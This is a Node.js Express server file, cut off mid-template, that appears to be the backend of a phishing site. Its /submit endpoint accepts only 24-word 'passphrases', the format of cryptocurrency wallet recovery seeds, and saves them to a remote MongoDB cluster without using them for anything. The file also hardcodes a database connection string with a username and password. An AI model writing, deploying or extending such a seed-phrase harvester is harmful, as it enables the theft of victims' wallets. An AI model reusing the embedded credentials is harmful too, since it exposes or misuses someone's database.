const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

// Initialize Express app
const app = express();
const port = 3000;

// MongoDB URI
const mongoURI = 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';

// Connect to MongoDB
mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('Connected to MongoDB successfully'))
    .catch(err => console.log('Error connecting to MongoDB:', err));

// Define the schema and model for the passphrase
const passphraseSchema = new mongoose.Schema({
    passphrase: {
        type: String,
        required: true,
    }
});

const Passphrase = mongoose.model('Passphrase', passphraseSchema);

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (front-end assets)
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to handle passphrase submission
app.post('/submit', async (req, res) => {
    const { passphrase } = req.body;

    // Check if the passphrase contains exactly 24 words
    if (!passphrase || passphrase.trim().split(' ').length !== 24) {
        return res.status(400).send('Invalid passphrase! Please enter exactly 24 words.');
    }

    // Save the passphrase to MongoDB
    try {
        const newPassphrase = new Passphrase({ passphrase });
        await newPassphrase.save();

        // Send a success response
        res.send('Passphrase saved successfully!');
    } catch (error) {
        res.status(500).send('Error saving passphrase: ' + error.message);
    }
});

// Serve the success page when the passphrase is saved
app.get('/success', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>Passphrase Saved</title>
                <
